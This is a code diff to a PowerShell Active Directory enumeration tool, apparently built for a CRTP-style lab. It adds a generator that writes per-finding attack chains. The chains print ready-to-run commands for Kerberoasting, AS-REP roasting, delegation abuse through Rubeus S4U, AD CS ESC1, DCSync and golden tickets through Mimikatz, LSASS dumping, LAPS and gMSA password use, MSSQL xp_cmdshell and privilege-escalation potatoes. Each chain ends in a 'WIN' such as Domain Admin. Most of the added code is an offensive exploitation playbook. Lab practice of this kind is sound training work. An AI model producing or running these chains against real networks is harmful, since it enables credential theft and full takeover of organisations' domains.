@@ -1600,11 +1600,134 @@ function Invoke-CRTPEnum {
         $ch += "     Note: SID filtering across a forest trust usually limits you to specific SPNs/resources."
     }
 
+    # PER-FINDING FAST CHAINS: for EVERY exploitable finding, steps+commands straight to a win
+    $ch += "`n" + ("=" * 76)
+    $ch += "PER-FINDING FAST CHAINS  (exploit each finding directly -> win / flag, ASAP)"
+    $ch += "Each block = one finding: numbered commands, then '=> WIN' = what you get."
+    $ch += ("-" * 76)
+    $seenC = @{}
+    $cn = 0
+    foreach($e in $expl){
+        $d = $e.Data; $t = _tgt $d
+        $k = "$($e.Type)|$t"
+        if ($seenC[$k]){ continue }; $seenC[$k] = $true
+        $cn++
+        switch($e.Type){
+            'Kerberoast' {
+                $ch += "`n($cn) KERBEROAST -> $t"
+                $ch += "    1) Rubeus.exe kerberoast /user:$t /nowrap /outfile:h.txt"
+                $ch += "    2) hashcat -m 13100 h.txt <wordlist>"
+                $ch += "    3) use the cracked password:  runas /netonly /user:$shortDom\$t powershell"
+                $ch += "    => WIN: creds for $t  (if it's privileged/admin -> flag or DA path)"
+            }
+            'ASREP' {
+                $ch += "`n($cn) AS-REP ROAST -> $t"
+                $ch += "    1) Rubeus.exe asreproast /user:$t /format:hashcat /nowrap /outfile:a.txt"
+                $ch += "    2) hashcat -m 18200 a.txt <wordlist>"
+                $ch += "    => WIN: creds for $t"
+            }
+            'ConstrainedUser' {
+                $ch += "`n($cn) CONSTRAINED DELEGATION (user) -> $t"
+                $ch += "    1) Rubeus.exe s4u /user:$t /rc4:<NTLM> /impersonateuser:administrator /msdsspn:$(($d.SPN -split ',')[0]) /ptt"
+                $ch += "    2) access the target service as administrator (e.g. dir \\<host>\c`$)"
+                $ch += "    => WIN: admin on that service -> loot/flag there"
+            }
+            'ConstrainedHost' {
+                $ch += "`n($cn) CONSTRAINED DELEGATION (host) -> $t"
+                $ch += "    1) Rubeus.exe s4u /user:$t`$ /rc4:<machine-NTLM> /impersonateuser:administrator /msdsspn:$(($d.SPN -split ',')[0]) /ptt"
+                $ch += "    => WIN: admin to that service as administrator"
+            }
+            'RBCD' {
+                $ch += "`n($cn) RBCD -> $t"
+                $ch += "    1) Rubeus.exe s4u /user:<controlled-acct>`$ /rc4:<NTLM> /impersonateuser:administrator /msdsspn:cifs/$t /ptt"
+                $ch += "    2) dir \\$t\c`$"
+                $ch += "    => WIN: admin on $t"
+            }
+            'UnconstrainedHost' {
+                $ch += "`n($cn) UNCONSTRAINED DELEGATION -> $t"
+                $ch += "    1) on ${t}:  Rubeus.exe monitor /interval:5 /nowrap"
+                $ch += "    2) coerce a DC to auth:  MS-RPRN.exe \\<DC-FQDN> \\$t"
+                $ch += "    3) Rubeus.exe ptt /ticket:<captured-DC.kirbi>"
+                $ch += "    4) DCSync krbtgt (block below)  => WIN: Domain Admin"
+            }
+            'MAQ' {
+                $ch += "`n($cn) MACHINEACCOUNTQUOTA = $($d.Quota) -> add a machine, then RBCD"
+                $ch += "    1) New-MachineAccount -MachineAccount evilpc -Password (ConvertTo-SecureString 'Pass123!' -AsPlainText -Force)"
+                $ch += "    2) set RBCD on <target> to allow evilpc`$"
+                $ch += "    3) Rubeus.exe s4u /user:evilpc`$ /rc4:<evilpc-NTLM> /impersonateuser:administrator /msdsspn:cifs/<target> /ptt"
+                $ch += "    => WIN: admin on <target>"
+            }
+            'ESC1' {
+                $ch += "`n($cn) AD CS ESC1 -> template $t"
+                $ch += "    1) Certify.exe request /ca:<DC>\<CA> /template:$t /altname:administrator"
+                $ch += "    2) convert to cert.pfx (openssl)"
+                $ch += "    3) Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:<pfxpass> /ptt"
+                $ch += "    => WIN: TGT as administrator (Domain Admin)"
+            }
+            'DCSync' {
+                $ch += "`n($cn) DCSYNC -> as $($d.Principal)"
+                $ch += "    1) Invoke-Mimi -Command '`"lsadump::dcsync /user:$shortDom\krbtgt`"'"
+                $ch += "    2) golden ticket:  Invoke-Mimi -Command '`"kerberos::golden /user:Administrator /domain:$Domain /sid:$(if($g_domainSID){$g_domainSID}else{'<SID>'}) /krbtgt:<hash> /ptt`"'"
+                $ch += "    => WIN: full domain (and persistence)"
+            }
+            'LAPS' {
+                $ch += "`n($cn) LAPS READABLE -> $t"
+                $ch += "    1) local admin password: $($d.Pwd)"
+                $ch += "    2) WSManWinRM.exe $t `"whoami`" .\administrator $($d.Pwd)   (or runas/PSRemoting)"
+                $ch += "    => WIN: local admin on $t -> dump creds / flag"
+            }
+            'GMSA' {
+                $ch += "`n($cn) gMSA READABLE -> $t"
+                $ch += "    1) `$g = Get-ADServiceAccount -Identity $t -Properties 'msDS-ManagedPassword'  (decode blob)"
+                $ch += "    2) use the NTLM:  Rubeus.exe asktgt /user:$t /rc4:<NTLM> /ptt"
+                $ch += "    => WIN: run as $t"
+            }
+            'GPP' {
+                $ch += "`n($cn) GPP CPASSWORD -> $($d.File)"
+                $ch += "    1) Get-GPPPassword   (or gpp-decrypt <cpassword>)"
+                $ch += "    => WIN: a recovered credential"
+            }
+            'MSSQL' {
+                $ch += "`n($cn) MSSQL -> $t"
+                $ch += "    1) Get-SQLServerLinkCrawl -Instance $t -Query 'exec master..xp_cmdshell ''whoami'''"
+                $ch += "    => WIN: OS command exec as the SQL service account"
+            }
+            'DumpTarget' {
+                $ch += "`n($cn) GO HERE -> $t  ($($d.PrivUser) logged on, you're admin)"
+                $ch += "    1) FindLSASSPID.exe ; minidumpdotnet.exe <pid> lsass.dmp   (on $t)"
+                $ch += "    2) parse offline -> use $($d.PrivUser)'s creds"
+                $ch += "    => WIN: that privileged user's credentials"
+            }
+            'UnconstrainedUser' {
+                $ch += "`n($cn) UNCONSTRAINED DELEGATION (account) -> $t"
+                $ch += "    1) Rubeus.exe monitor /interval:5 /nowrap   (capture TGTs delegated to $t)"
+                $ch += "    => WIN: a delegated TGT (ideally a DC/admin) -> DCSync"
+            }
+            'Priv_SeImpersonatePrivilege' {
+                $ch += "`n($cn) SeImpersonate -> local SYSTEM"
+                $ch += "    1) PrintSpoofer.exe -i -c cmd.exe   (or GodPotato)"
+                $ch += "    => WIN: SYSTEM on $env:COMPUTERNAME"
+            }
+            'Priv_SeDebugPrivilege' {
+                $ch += "`n($cn) SeDebug -> dump LSASS"
+                $ch += "    1) FindLSASSPID.exe ; minidumpdotnet.exe <pid> lsass.dmp"
+                $ch += "    => WIN: logged-on credentials"
+            }
+            'Priv_SeBackupPrivilege' {
+                $ch += "`n($cn) SeBackup -> read protected hives"
+                $ch += "    1) reg save HKLM\SAM sam.save ; reg save HKLM\SYSTEM system.save"
+                $ch += "    => WIN: offline creds (on a DC: NTDS.dit)"
+            }
+            default { }
+        }
+    }
+    if ($cn -eq 0){ $ch += "`n(no direct-exploit findings this run -> follow the [GAP] steps above to create one)" }
+
     $ch += "`n============================================================================"
     $ch += " DONE when you have: $goal"
     $ch += " Re-run this tool as each new identity to rebuild the chain from the new position."
     Save 'ATTACK_CHAIN.txt' $ch
-    Log " Attack chain: $run\ATTACK_CHAIN.txt   (ordered route to EA)" 'Magenta'
+    Log " Attack chain: $run\ATTACK_CHAIN.txt   (per-finding chains + route to EA)" 'Magenta'
 
     # ---------------- MASTER findings (dedup, accumulates across runs) ----------------
     try {
